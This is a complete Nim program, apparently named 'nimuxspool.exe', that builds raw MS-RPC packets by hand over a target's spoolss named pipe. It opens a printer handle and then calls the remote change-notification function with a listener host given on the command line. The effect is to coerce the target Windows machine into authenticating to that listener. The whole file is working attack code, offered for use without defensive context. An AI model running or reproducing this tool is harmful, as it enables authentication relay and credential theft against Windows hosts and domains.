import std/[os, strutils]

type
  DWord = uint32
  Handle = pointer
  WChar = uint16

const
  GenericReadWrite = 0xC0000000'u32
  OpenExisting = 3'u32
  NormalAttr = 0x80'u32
  InvalidHandleValue = -1

proc CreateFileW(lpFileName: ptr WChar; dwDesiredAccess, dwShareMode: DWord;
                 lpSecurityAttributes: pointer; dwCreationDisposition,
                 dwFlagsAndAttributes: DWord; hTemplateFile: Handle): Handle
  {.stdcall, dynlib: "kernel32.dll", importc: "CreateFileW".}
proc ReadFile(hFile: Handle; lpBuffer: pointer; nNumberOfBytesToRead: DWord;
              lpNumberOfBytesRead: ptr DWord; lpOverlapped: pointer): int32
  {.stdcall, dynlib: "kernel32.dll", importc: "ReadFile".}
proc WriteFile(hFile: Handle; lpBuffer: pointer; nNumberOfBytesToWrite: DWord;
               lpNumberOfBytesWritten: ptr DWord; lpOverlapped: pointer): int32
  {.stdcall, dynlib: "kernel32.dll", importc: "WriteFile".}
proc CloseHandle(hObject: Handle): int32
  {.stdcall, dynlib: "kernel32.dll", importc: "CloseHandle".}
proc GetLastError(): DWord
  {.stdcall, dynlib: "kernel32.dll", importc: "GetLastError".}
proc Sleep(dwMilliseconds: DWord)
  {.stdcall, dynlib: "kernel32.dll", importc: "Sleep".}

proc toWide(s: string): seq[WChar] =
  for c in s:
    result.add WChar(ord(c))
  result.add 0'u16

proc emit(outPath, line: string) =
  echo line
  if outPath.len > 0:
    try:
      var f = open(outPath, fmAppend)
      try:
        f.write(line)
        f.write("\r\n")
      finally:
        f.close()
    except CatchableError:
      discard

proc addU16Le(s: var string; v: uint16) =
  s.add char(v and 0xff)
  s.add char((v shr 8) and 0xff)

proc addU32Le(s: var string; v: uint32) =
  s.add char(v and 0xff)
  s.add char((v shr 8) and 0xff)
  s.add char((v shr 16) and 0xff)
  s.add char((v shr 24) and 0xff)

proc readU16Le(s: string; off: int): uint16 =
  if off + 1 >= s.len: return 0
  uint16(ord(s[off])) or (uint16(ord(s[off + 1])) shl 8)

proc readU32Le(s: string; off: int): uint32 =
  if off + 3 >= s.len: return 0xffffffff'u32
  uint32(ord(s[off])) or
    (uint32(ord(s[off + 1])) shl 8) or
    (uint32(ord(s[off + 2])) shl 16) or
    (uint32(ord(s[off + 3])) shl 24)

proc ndrWstr(s: string): string =
  let wchars = s.len + 1
  result.addU32Le uint32(wchars)
  result.addU32Le 0
  result.addU32Le uint32(wchars)
  for c in s:
    result.add c
    result.add '\0'
  result.add '\0'
  result.add '\0'
  while (result.len mod 4) != 0:
    result.add '\0'

proc rpcBindRprn(callId = 1'u32): string =
  const rprn = [
    byte 0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab,
    0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89, 0xab
  ]
  const ndr = [
    byte 0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
    0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60
  ]
  var body = ""
  body.addU16Le 4280
  body.addU16Le 4280
  body.addU32Le 0
  body.add char(1)
  body.add char(0)
  body.addU16Le 0
  body.addU16Le 0
  body.add char(1)
  body.add char(0)
  for b in rprn: body.add char(b)
  body.addU16Le 1
  body.addU16Le 0
  for b in ndr: body.add char(b)
  body.addU32Le 2
  result.add char(5)
  result.add char(0)
  result.add char(11)
  result.add char(3)
  result.add "\x10\x00\x00\x00"
  result.addU16Le uint16(16 + body.len)
  result.addU16Le 0
  result.addU32Le callId
  result.add body

proc rpcRequest(opnum: uint16; stub: string; callId: uint32): string =
  result.add char(5)
  result.add char(0)
  result.add char(0)
  result.add char(3)
  result.add "\x10\x00\x00\x00"
  result.addU16Le uint16(24 + stub.len)
  result.addU16Le 0
  result.addU32Le callId
  result.addU32Le uint32(stub.len)
  result.addU16Le 0
  result.addU16Le opnum
  result.add stub

proc responseStub(pdu: string): string =
  if pdu.len < 24 or ord(pdu[2]) != 2:
    return ""
  let fragLen = int(readU16Le(pdu, 8))
  let authLen = int(readU16Le(pdu, 10))
  var endAt = if fragLen > 0 and fragLen <= pdu.len: fragLen else: pdu.len
  if authLen > 0:
    endAt -= authLen + 8
  if endAt > 24 and endAt <= pdu.len:
    result = pdu[24 ..< endAt]

proc writePipe(h: Handle; data: string): bool =
  if data.len == 0: return true
  var written: DWord = 0
  WriteFile(h, unsafeAddr data[0], DWord(data.len), addr written, nil) != 0 and
    int(written) == data.len

proc readPipe(h: Handle): string =
  var buf = newString(8192)
  var got: DWord = 0
  if ReadFile(h, addr buf[0], DWord(buf.len), addr got, nil) == 0:
    return ""
  result = buf[0 ..< int(got)]

proc openPipe(target: string): tuple[h: Handle; err: DWord] =
  let pipePath = "\\\\" & target & "\\pipe\\spoolss"
  var w = toWide(pipePath)
  for _ in 0 ..< 3:
    result.h = CreateFileW(addr w[0], GenericReadWrite, 0, nil,
      OpenExisting, NormalAttr, nil)
    if cast[int](result.h) != InvalidHandleValue:
      result.err = 0
      return
    result.err = GetLastError()
    Sleep(500)

proc rpcStatus(stub: string): uint32 =
  if stub.len >= 4:
    readU32Le(stub, stub.len - 4)
  else:
    0xffffffff'u32

proc main() =
  if paramCount() < 2:
    emit("", "usage: nimuxspool.exe <target-printer-host> <listener-host> [out]")
    quit 2
  let target = paramStr(1)
  let listener = paramStr(2)
  let outPath = if paramCount() >= 3: paramStr(3) else: ""
  let pipe = openPipe(target)
  if cast[int](pipe.h) == InvalidHandleValue:
    emit(outPath, "pipe open failed target=" & target & " win32=" & $pipe.err)
    quit 1
  defer:
    discard CloseHandle(pipe.h)

  if not writePipe(pipe.h, rpcBindRprn(1)):
    emit(outPath, "bind write failed win32=" & $GetLastError())
    quit 1
  let bindAck = readPipe(pipe.h)
  if bindAck.len < 16 or ord(bindAck[2]) != 12:
    emit(outPath, "bind failed bytes=" & $bindAck.len & " win32=" & $GetLastError())
    quit 1
  emit(outPath, "bind ok target=" & target & " listener=" & listener)

  var openStub = ""
  openStub.addU32Le 0x00020000'u32
  openStub.add ndrWstr("\\\\" & target)
  openStub.addU32Le 0
  openStub.addU32Le 0
  openStub.addU32Le 0
  openStub.addU32Le 0x00020000'u32
  if not writePipe(pipe.h, rpcRequest(1, openStub, 2)):
    emit(outPath, "open write failed win32=" & $GetLastError())
    quit 1
  let openResp = responseStub(readPipe(pipe.h))
  let openStatus = rpcStatus(openResp)
  if openResp.len < 24 or openStatus != 0:
    emit(outPath, "open failed status=0x" & openStatus.toHex(8) & " bytes=" & $openResp.len)
    quit 1
  let handle = openResp[0 ..< 20]
  emit(outPath, "open ok target=\\\\" & target)

  var notifStub = ""
  notifStub.add handle
  notifStub.addU32Le 0x00000100'u32
  notifStub.addU32Le 0
  notifStub.addU32Le 0x00020004'u32
  notifStub.add ndrWstr("\\\\" & listener)
  notifStub.addU32Le 0
  notifStub.addU32Le 0
  if not writePipe(pipe.h, rpcRequest(65, notifStub, 3)):
    emit(outPath, "notify write failed win32=" & $GetLastError())
    quit 1
  let notifResp = responseStub(readPipe(pipe.h))
  let notifStatus = rpcStatus(notifResp)
  emit(outPath, "notify status=0x" & notifStatus.toHex(8) &
    " target=\\\\" & target & " listener=\\\\" & listener)
  if notifStatus in [0'u32, 5'u32, 6'u32, 0x000006BA'u32]:
    emit(outPath, "coerce triggered target=\\\\" & target & " listener=\\\\" & listener)
    quit 0
  quit 1

when isMainModule:
  main()
